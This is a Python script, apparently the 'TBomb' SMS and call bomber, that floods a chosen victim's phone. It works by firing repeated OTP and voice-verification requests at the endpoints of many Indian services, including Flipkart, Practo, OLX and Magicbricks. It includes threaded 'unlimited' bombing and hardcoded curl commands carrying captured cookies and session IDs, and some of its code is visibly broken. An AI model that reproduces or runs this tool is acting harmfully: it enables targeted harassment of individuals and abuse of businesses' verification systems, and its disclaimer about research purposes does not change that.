from datetime import datetime
import os, hashlib, sys, time, threading, string, random, base64
import urllib.request, urllib.parse, json, requests
from colorama import Fore, Style

class IconicDecorator(object):
    def __init__(self):
        self.PASS = Style.BRIGHT + Fore.GREEN + "[ ✔ ]" + Style.RESET_ALL
        self.FAIL = Style.BRIGHT + Fore.RED + "[ ✘ ]" + Style.RESET_ALL
        self.WARN = Style.BRIGHT + Fore.YELLOW + "[ ! ]" + Style.RESET_ALL
        self.HEAD = Style.BRIGHT + Fore.CYAN + "[ # ]" + Style.RESET_ALL
        self.CMDL = Style.BRIGHT + Fore.BLUE + "[ → ]" + Style.RESET_ALL
        self.STDS = "     "

class StatusDecorator(object):
    def __init__(self):
        self.PASS = Style.BRIGHT + Fore.GREEN + "[ SUCCESS ]" + Style.RESET_ALL
        self.FAIL = Style.BRIGHT + Fore.RED + "[ FAILURE ]" + Style.RESET_ALL
        self.WARN = Style.BRIGHT + Fore.YELLOW + "[ WARNING ]" + Style.RESET_ALL
        self.HEAD = Style.BRIGHT + Fore.CYAN + "[ SECTION ]" + Style.RESET_ALL
        self.CMDL = Style.BRIGHT + Fore.BLUE + "[ COMMAND ]" + Style.RESET_ALL
        self.STDS = "           "

class MessageDecorator(object):
    def __init__(self, attr):
        ICON = IconicDecorator()
        STAT = StatusDecorator()
        if attr == "icon":
            self.PASS = ICON.PASS
            self.FAIL = ICON.FAIL
            self.WARN = ICON.WARN
            self.HEAD = ICON.HEAD
            self.CMDL = ICON.CMDL
            self.STDS = ICON.STDS
        elif attr == "stat":
            self.PASS = STAT.PASS
            self.FAIL = STAT.FAIL
            self.WARN = STAT.WARN
            self.HEAD = STAT.HEAD
            self.CMDL = STAT.CMDL
            self.STDS = STAT.STDS

    def SuccessMessage(self, RequestMessage):
        print(self.PASS + " " + Style.RESET_ALL + RequestMessage)

    def FailureMessage(self, RequestMessage):
        print(self.FAIL + " " + Style.RESET_ALL + RequestMessage)

    def WarningMessage(self, RequestMessage):
        print(self.WARN + " " + Style.RESET_ALL + RequestMessage)

    def SectionMessage(self, RequestMessage):
        print(self.HEAD + " " + Fore.CYAN + Style.BRIGHT + RequestMessage + Style.RESET_ALL)

    def CommandMessage(self, RequestMessage):
        return self.CMDL + " " + Style.RESET_ALL + RequestMessage

    def GeneralMessage(self, RequestMessage):
        print(self.STDS + " " + Style.RESET_ALL + RequestMessage)

mesgdcrt = MessageDecorator("icon")

def dpndchek():
    try:
        import requests
    except ImportError:
        mesgdcrt.FailureMessage("Some dependencies could not be imported")
        mesgdcrt.GeneralMessage("Type `pip3 install -r requirments.txt` to install all required packages")
        sys.exit()

def readisdc():
    with open("isdcodes.json") as file:
        isdcodes = json.load(file)
    return isdcodes

country_codes = readisdc()["isdcodes"]

def clerscrn():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def banntext():
    clerscrn()
    colrlist = [Fore.GREEN, Fore.RED, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE]
    logo = """
ooooooooooooo oooooooooo.                               .o8       
8'   888   `8 `888'   `Y8b                             "888       
     888       888     888  .ooooo.  ooo. .oo.  .oo.    888oooo.  
     888       888oooo888' d88' `88b `888P"Y88bP"Y88b   d88' `88b 
     888       888    `88b 888   888  888   888   888   888   888 
     888       888    .88P 888   888  888   888   888   888   888 
    o888o     o888bood8P'  `Y8bod8P' o888o o888o o888o  `Y8bod8P' 
    """
    print(random.choice(colrlist) + logo + Style.RESET_ALL)

countinf = 0
maxlim = 0

def infinite(pn, dl, ch, max):
    global countinf
    while True:
        while os.path.exists("proc.xxx"):
            time.sleep(0.5)
        os.system("touch proc.xxx")
        api = random.choice(ch)
        try:
            ret = getapi(pn, api, 91)
        except Exception:
            ret = False
        if not ret:
            while ch.count(api) > 0:
                ch.remove(api)
            continue
        os.system("rm proc.xxx >/dev/null 2>&1")
        countinf += 1
        time.sleep(float(dl))
        if countinf > maxlim:
            sys.exit()

def chekintr():
    try:
        requests.get("https://www.google.com")
    except Exception:
        mesgdcrt.FailureMessage("Poor internet connection detected")
        banntext()
        sys.exit()

def getapi(pn, lim, cc):
    cc = str(cc)
    pn = str(pn)
    lim = int(lim)
    with open("sitedata.json") as file:
        sitedata = json.load(file)["sitedata"]
    #print(sitedata)
    if lim == 0:
        try:
            hyperurl = sitedata["oyorooms"]["hyperurl"]
            hyperurl = hyperurl.replace("#ISDCODE", cc)
            hyperurl = hyperurl.replace["#PHONENO", pn]
            urllib.request.urlopen(hyperurl)
        except (urllib.error.HTTPError, urllib.error.URLError):
            return False
    elif lim == 1:
        try:
            hyperurl = sitedata["delhivery"]["hyperurl"]
            hyperurl = hyperurl.replace["#PHONENO", pn]
            urllib.request.urlopen(hyperurl)
        except (urllib.error.HTTPError, urllib.error.URLError):
            return False
    elif lim == 2:
        try:
            hyperurl = sitedata["confirmtkt"]["hyperurl"]
            hyperurl = hyperurl.replace["#PHONENO", pn]
            urllib.request.urlopen(hyperurl)
        except (urllib.error.HTTPError, urllib.error.URLError):
            return False
    elif lim == 3:
        hyperurl = sitedata["pharmeasy"]["hyperurl"]
        headers = sitedata["pharmeasy"]["headers"]
        data = sitedata["pharmeasy"]["data"]
        data["contactNumber"] = pn
        response = requests.get(hyperurl, heeaders=headers, json=data)
        return response.status_code==200
    elif lim == 4:
        hyperurl = sitedata["heromotorcorp"]["hyperurl"]
        cookies = sitedata["heromotorcorp"]["cookies"]
        headers = sitedata["pharmeasy"]["headers"]
        data = sitedata["pharmeasy"]["data"]
        data["mobile_no"] = pn
        response = requests.get(hyperurl, heeaders=headers, cookies=cookies, data=data)
        return response.status_code==200
    elif lim == 5:
        hyperurl = sitedata["indialends"]["hyperurl"]
        cookies = sitedata["indialends"]["cookies"]
        headers = sitedata["indialends"]["headers"]
        data = sitedata["indialends"]["data"]
        data["jfsdfu14hkgertd"] = pn
        data["ertysvfj74sje"] = cc
        response = requests.get(hyperurl, heeaders=headers, cookies=cookies, data=data)
        return response.status_code==200
    elif lim==6:
        hyperurl = sitedata["flipkart6"]["hyperurl"]
        headers = sitedata["flipkart6"]["headers"]
        data = sitedata["flipkart6"]["data"]
        data["loginId"] = "+" + cc + pn
        response = requests.post(hyperurl, headers=headers, json=data)
        return response.status_code==200
    elif lim==7:
        hyperurl = sitedata["flipkart5"]["hyperurl"]
        cookies = sitedata["flipkart5"]["cookies"]
        headers = sitedata["flipkart5"]["headers"]
        data = sitedata["flipkart5"]["data"]
        data["loginId"] = "+" + cc + pn
        response = requests.post(hyperurl, headers=headers, cookies=cookies, data=data)
        return response.status_code==200
    elif lim == 8:
        hyperurl = sitedata["ref-r"]["hyperurl"]
        headers = sitedata["ref-r"]["headers"]
        data = sitedata["ref-r"]["data"]
        data["mobile"] = pn
        response = requests.post(hyperurl, headers=headers, data=data)
        return response.status_code==200
    elif lim == 9:
        hyperurl = sitedata["practo"]["hyperurl"]
        headers = sitedata["practo"]["headers"]
        data = sitedata["practo"]["data"]
        data["mobile"] = "+" + cc + pn
        response = requests.post(hyperurl, headers=headers, data=data)
        return response.text.find("success") != -1 
    elif lim == 10:
        hyperurl = sitedata["pizzahut"]["hyperurl"]
        headers = sitedata["pizzahut"]["headers"]
        data = sitedata["pizzahut"]["data"]
        data["customer"]["MobileNo"] = pn
        data["customer"]["UserName"] = pn
        response = requests.post(hyperurl, headers=headers, data=data)
        return response.status_code==200
    elif lim == 11:
        hyperurl = sitedata["goibibo"]["hyperurl"]
        headers = sitedata["goibibo"]["headers"]
        data = sitedata["goibibo"]["data"]
        data["mbl"] = pn
        response = requests.post(hyperurl, headers=headers, data=data)
        return response.status_code==200
    elif lim == 12:
        hyperurl = sitedata["apollopharmacy"]["hyperurl"]
        headers = sitedata["apollopharmacy"]["headers"]
        data = sitedata["apollopharmacy"]["data"]
        data["mobile"] = pn
        response = requests.post(hyperurl, headers=headers, data=data)
        return response.status_code==200
    elif lim == 13:
        hyperurl = sitedata["ajio"]["hyperurl"]
        cookies = sitedata["ajio"]["cookies"]
        headers = sitedata["ajio"]["headers"]
        data = sitedata["ajio"]["data"]
        data["mobileNumber"] = pn
        response = requests.post(hyperurl, headers=headers, cookies=cookies, json=data)
        return response.text.find("\"statusCode\":\"1\"") != -1
    elif lim == 14:
        hyperurl = sitedata["altbalaji"]["hyperurl"]
        headers = sitedata["altbalaji"]["headers"]
        data = sitedata["altbalaji"]["data"]
        data["country_code"] = cc
        data["phone_number"] = pn
        response = requests.post(hyperurl, headers=headers, json=data)
        return response.text == "24f467b24087ff48c96321786d89c69f"
    elif lim == 15:
        hyperurl = sitedata["aala"]["hyperurl"]
        cookies = sitedata["aala"]["cookies"]
        headers = sitedata["aala"]["headers"]
        data = sitedata["aala"]["data"]
        data["email"] = cc + pn
        response = requests.post(hyperurl, headers=headers, cookies=cookies, json=data)
        return response.text.find("code:") != -1
    elif lim == 16:
        hyperurl = sitedata["grab"]["hyperurl"]
        data = sitedata["grab"]["data"]
        data["phoneNumber"] = cc + pn
        response = requests.post(hyperurl, data=data)
        return response.status_code==200
    elif lim == 100:
        rd = os.popen('curl -s -X GET "https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/' +  pn + '?callType=otpOnCall"').read()
        return rd.lower().find("new otp has been") != -1
    elif lim == 101:
        rd = os.popen('curl -s -X POST -d mobile=%2B' + cc + '-' + pn + ' https://marketing.tllms.com/elearn/api/v4/authentications/phone_call').read()
        return rd.lower().find("otp requests exceeded") == -1
    elif lim == 102:
        rd = os.popen('curl -s -X POST -H "Host:www.realestateindia.com" -H "content-length:58" -H "accept:text/html, */*; q=0.01" -H "origin:https://www.realestateindia.com" -H "x-requested-with:XMLHttpRequest" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "referer:https://www.realestateindia.com/thanks.php?newreg" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "cookie:_gat=1" -H "cookie:rei_mem_mobile_verify_status=0" -H "cookie:rei_mem_email_verify_status=N" -H "cookie:rei_mem_block_status=0" -H "cookie:rei_member_country=IN" -H "cookie:rei_paid_status=0" -H "cookie:rei_member_type=1" -H "cookie:rei_member_email=Fakemam%40ril.com" -H "cookie:rei_member_name=Fakeman" -H "cookie:rei_member_id=1547045" -H "cookie:cooki_sess_id=9q8bsucj6mgvu2dc03bfsvlf07" -H "cookie:name=9q8bsucj6mgvu2dc03bfsvlf07" -H "cookie:_gid=GA1.2.626525909.1560836369" -H "cookie:_ga=GA1.2.1033079331.1560836369" -H "cookie:visitedToken=176961560836367" -d \'action_id=call_to_otp&mob_num=' + pn + '&member_id=1547045\' "https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php?sid=0.5983221395805354"').read()
        return rd.lower().find("y") != -1
    elif lim == 103:
        os.system('curl -s -X POST -H "Host:www.olx.in" -H "content-length:44" -H "accept:*/*" -H "x-newrelic-id:VQMGU1ZVDxABU1lbBgMDUlI=" -H "origin:https://www.olx.in" -H "user-agent:Mozilla/5.0 (Linux; Android 5.0.2; SH-04G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "content-type:application/json" -H "referer:https://www.olx.in/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9" -H "cookie:onap=16b1b8f48d4x746d47ab-1-16b1b8f48d4x746d47ab-19-1559537345" -H "cookie:bm_sv=CDB97F50DA6615AC420F3E6E77B04E42~OoX2fAuP7ggcNa0VjzE95FzJNKRdJlW09Hja0/cysIGF1sJoBO7i0ndGXqnTWLaunlyxktHLbE8BSstPCRYn8VdP15lvUxK3ZY9ahXOSgwAidxwXd1jCe5wjIzYbiXp5eKNWfFpowhFbpxloe+SrbiE0YHJVPcCV5bmdsHgPfQc=" -H "cookie:AMP_TOKEN=%24NOT_FOUND" -H "cookie:hint=true" -H "cookie:_gid=GA1.2.369819276.1559535517" -H "cookie:_ga=GA1.2.665688753.1559535517" -H "cookie:ldTd=true" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:HIDE_ONBOARDING_LOCATION=true" -H "cookie:testCookie=testCookie" -H "cookie:ak_bmsc=307C5311FB00A3F4E856AFFE1A9D000B0214BED9E0210000909FF45C1E802067~plFZfbMQGgEDr7OWVe9FvqfT24ZtOVMamtYcaip71IYOrv2+SQ6fokSvMk2Uesz5v1sFfaichbtDgeVSj3te3vXJKezSWgvoVWrK7gfzFrLz1ruBm0MQj01V5CmpaTr6tRgDRSN6bks3nqvOHzR0tA1IoqfDfq2MKtmDjbknCI5FlLYUTwqlnwHowYArfybn2n3yilE6VKHjW+tH8kqjAfH8BGuijpmO9pNkgmIyOeaZIVM3k6FGOL3Wj3jLI8uGaU" -H "cookie:_abck=153BD3D333948A58932748CAC3D4C3F40214BED9E0210000909FF45C18838E05~0~8O+udxdG38sBFTPZpaBL4IGj7eUcKJ1VwAtJ52GMO5E=~-1~-1" -H "cookie:bm_sz=BD665D919F7C6FA8374F196445596436~YAAQ2b4UArpOAwtrAQAAq0qPGwNksHBgphLwDzwfBlwIRQJAG7txmjBo/of7NiAJ93gy/7vBhQ9l5sIKdwtl2j+U4bys2Hhh5tZlZL/jqdnW/JrgmgawcxiunAJ32BbY9UtnFIrNxbbRvzQCYnSwf/cz9a7jURsui7leuLaVm7mQEcHPOtC6g5jrToAMTbdA" -H "cookie:97c09e2aabdfed89b87a3010d7f13c64=353b4f9fd82d26268ad11b2c1e9ae019" -H "cookie:lqstatus=1559536704" -H "cookie:laquesis=pan-26381@a#pan-27752@b#pan-30043@b#pana-26381@b" -d \'{"type":"call","descriptor":"+91' + pn + '"}\' "https://www.olx.in/api/challenges" >/dev/null 2>&1')
        return True
    elif lim == 104:
        rd = os.popen('curl -s -X GET -H "Host:api.magicbricks.com" -H "Connection:keep-alive" -H "User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Safari/537.36" -H "Save-Data:on" -H "Accept:image/webp,image/apng,image/*,*/*;q=0.8" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" "https://api.magicbricks.com/bricks/verifyOnCall.html?mobile=' + pn + '"').read().decode('utf-8')
        return rd.lower().strip().find('callmade') != -1
    elif lim == 106:
        rd = os.popen('curl -s "https://www.myupchar.com/user_profile/resend_otp_via_voice?id=' + pn + '"').read()
        return rd.find("1") != -1
    return False

def remsp(num):
    num = num.replace(' ', '')
    num = num.replace('-', '')
    return num

def start(target, counter, delay, ch, cc):
    clerscrn()
    banntext()
    failed = 0
    requested = 0
    success = int(requested) - int(failed)
    bombs = int(counter) + 1
    while success < (int(bombs)):
        clerscrn()
        banntext()
        try:
            api = random.choice(ch)
        except Exception:
            if cc == "91":
                mesgdcrt.FailureMessage("All API endpoints seem to have expired or patched up")
                mesgdcrt.GeneralMessage("You must update TBomb to continue using this tool")
                input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
                sys.exit()
            else:
                if success>0:
                    mesgdcrt.FailureMessage("Bombing limit for your country has been reached")
                    mesgdcrt.GeneralMessage("TBomb is worked upon to increase the international limit")
                    input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
                    os.system("rm *.xxx* > /dev/null 2>&1")
                    banntext()
                    sys.exit()
                else:
                    mesgdcrt.FailureMessage("Your country code is not supported as of now")
                    mesgdcrt.GeneralMessage("You can request the support for your country code by mailing at 'ggspeedx29@gmail.com' about it")
                    input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
                    sys.exit()
        mesgdcrt.SectionMessage("Bombing is in progress - Please be patient")
        mesgdcrt.GeneralMessage("Please stay connected to the internet during bombing")
        mesgdcrt.GeneralMessage("Target number       : " + str(cc) + str(target))
        mesgdcrt.GeneralMessage("Sent requests       : " + str(requested))
        mesgdcrt.GeneralMessage("Successful requests : " + str(success))
        mesgdcrt.GeneralMessage("Failed requests     : " + str(failed))
        mesgdcrt.WarningMessage("This tool was made for fun and research purposes only")
        mesgdcrt.SuccessMessage("TBomb was created by SpeedX")
        try:
            result = getapi(target, api, cc)
        except Exception:
            result = False
        requested = requested + 1
        if result:
            success = success + 1
        else:
            failed = failed + 1
            while ch.count(api) > 0:
                ch.remove(api)
            time.sleep(float(delay))
            if requested % 3 == 0:
                chekintr()
    mesgdcrt.SuccessMessage("Bombing completed!")
    os.system("rm *.xxx* > /dev/null 2>&1")
    banntext()
    sys.exit()

def update():
    mesgdcrt.SectionMessage("Checking for updates")
    ver = urllib.request.urlopen("https://raw.githubusercontent.com/TheSpeedX/TBomb/master/.version").read().decode('utf-8')
    ver1 = ""
    try:
        ver1 = open(".version","r").read()
    except Exception:
        pass
    if ver != ver1:
        mesgdcrt.WarningMessage("An update is available")
        mesgdcrt.GeneralMessage("Starting update...")
        stuff_to_update = ["bomber.py", ".version", "bombmode.py"]
        for fl in stuff_to_update:
            dat = urllib.request.urlopen("https://raw.githubusercontent.com/TheSpeedX/TBomb/master/" + fl).read()
            file = open(fl, "wb")
            file.write(dat)
            file.close()
        mesgdcrt.SuccessMessage("TBomb was updated to the latest version")
        mesgdcrt.GeneralMessage("Please run the script again to load the latest version")
        sys.exit()
    else:
        mesgdcrt.SuccessMessage("TBomb is up-to-date")
        mesgdcrt.GeneralMessage("Starting TBomb")

def notifyen():
    try:
        noti = urllib.request.urlopen("https://raw.githubusercontent.com/TheSpeedX/TBomb/master/.notify").read().decode('utf-8')
        noti = noti.upper().strip()
        if len(noti) > 10:
            mesgdcrt.SectionMessage("NOTIFICATION: " + noti)
    except Exception:
        pass

def callbomb():
    while True:
        pn = ""
        cc = input(mesgdcrt.CommandMessage("Enter your country code (Without +) "))
        if "+" in cc:
            tc = list(cc)
            tc.remove('+')
            cc = "".join(tc)
            cc = cc.strip()
        pn = input(mesgdcrt.CommandMessage("Enter the target number +" + cc + " "))
        pn = remsp(pn)
        if len(cc) >= 4 or len(cc) < 1:
            mesgdcrt.WarningMessage("The country code that you have entered is invalid")
            continue
        if len(pn) <= 6:
            mesgdcrt.WarningMessage("The phone number that you have entered is not valid")
            continue
        for cch in str(cc + pn):
            if not cch.isdigit():
                mesgdcrt.WarningMessage("The phone number is expected to contain only numeric characters")
                continue
        break
    type = 0
    try:
        if sys.argv[1] == "call":
            type = 1
    except Exception:
        type = 0
    if type == 1:
        nm = int(input(mesgdcrt.CommandMessage("Enter number of calls to send (Max 15) ")))
        if nm > 15:
            mesgdcrt.WarningMessage("You have requested " + str(nm) + " calls")
            mesgdcrt.GeneralMessage("Automatically capping the value to 15")
            nm = 15
        dl = float(input(mesgdcrt.CommandMessage("Enter delay time (in seconds) [Recommended 10] ")))
    elif type == 0:
        if cc == "91":
            nm = int(input(mesgdcrt.CommandMessage("Enter number of messages to send (0 for unlimited) ")))
            dl = float(input(mesgdcrt.CommandMessage("Enter delay time (in seconds) [Recommended 2] ")))
        else:
            nm = int(input(mesgdcrt.CommandMessage("Enter number of messages to send ")))
            dl = float(input(mesgdcrt.CommandMessage("Enter delay time (in seconds) [Recommended 10] ")))
    maxlim = 0
    if cc == "91":
        maxlim = 500
    else:
        maxlim = 100
    if nm > maxlim:
        mesgdcrt.WarningMessage("Due to the script abuse, we can provide only " + str(maxlim) + " messages at once")
        mesgdcrt.GeneralMessage("Automatically capping the value to " + str(maxlim) + " messages")
        nm = maxlim
    if not cc.strip() == "91":
        if type == 1:
            mesgdcrt.WarningMessage("Call bombing is currently supported only for Indian numbers")
            input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
            banntext()
            sys.exit()
        cnt = 0
        if pn.strip() == '' or dl <= 0 or nm <= 0 or cc.strip() == '' or cc.find('+') != -1:
            mesgdcrt.WarningMessage("The inputs provided are invalid")
            input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
            banntext()
            sys.exit()
        ch = [0, 14, 15, 16]
        start(pn, nm, dl, ch, str(cc))
        sys.exit()
    ch = [i for i in range(17)]
    cbomb = False
    if pn.strip() == '' or dl <= 0 or nm < 0:
        mesgdcrt.WarningMessage("The inputs provided are invalid")
        input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
        banntext()
        sys.exit()
    if type == 1:
        mesgdcrt.WarningMessage("Call bomb might not work on DND activated numbers")
        mesgdcrt.GeneralMessage("Overloading the call bomber might reduce the working period")
        cbomb = True
    if cbomb:
        chl = [100, 101, 102, 103, 104, 105, 106]
        start(pn, nm, dl, chl, str(cc))
        sys.exit()
    if nm == 0:
        nt = int(input(mesgdcrt.CommandMessage("Number of threads [10-20] ")))
        if nt <= 0 or nt >= 30:
            mesgdcrt.WarningMessage("The range of 20-25 is highly recommended")
            mesgdcrt.GeneralMessage("Resuming operation...")
        mesgdcrt.GeneralMessage("This script is experimental and can be incredibly fast")
        t = [None] * nt
        mesgdcrt.SectionMessage("Gearing up the call bomber - Please be patient")
        mesgdcrt.GeneralMessage("Please stay connected to the internet during bombing")
        mesgdcrt.GeneralMessage("Target number     : +91 " + pn)
        mesgdcrt.GeneralMessage("Number of threads : " + nt + " threads")
        mesgdcrt.GeneralMessage("Delay per call    : " + dl + " seconds")
        mesgdcrt.WarningMessage("This tool was made for fun and research purposes only")
        mesgdcrt.SuccessMessage("TBomb was created by SpeedX")
        input(mesgdcrt.CommandMessage("Press [CTRL+Z] to suspend the bomber or [ENTER] to resume it"))
        os.system('rm *.xxx* > /dev/null 2>&1')
        mesgdcrt.GeneralMessage("Starting bomber...")
        for i in range(nt):
            t[i] = threading.Thread(target=infinite, args=(pn, dl, ch, maxlim,))
            t[i].daemon = True
            t[i].start()
        time.sleep(2)
        ci = 0
        while True:
            ci += 1
            l = countinf
            mesgdcrt.GeneralMessage("Total Number of Requests Sent : ", l)
            if int(l) > maxlim:
                mesgdcrt.SuccessMessage("Due to the script abuse, we can provide only " + str(maxlim) + " messages at once")
                input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
                os.system("rm *xxx* > /dev/null 2>&1")
                banntext()
                sys.exit()
            time.sleep(1)
            if ci % 3 == 0:
                chekintr()
    else:
        start(pn, nm, dl, ch, '91')
        sys.exit()

if __name__ == "__main__":
    try:
        clerscrn()
        banntext()
        chekintr()
        #update()
        notifyen()
        callbomb()
    except KeyboardInterrupt:
        print()
        mesgdcrt.WarningMessage("Received INTR call - Exiting...")
        sys.exit()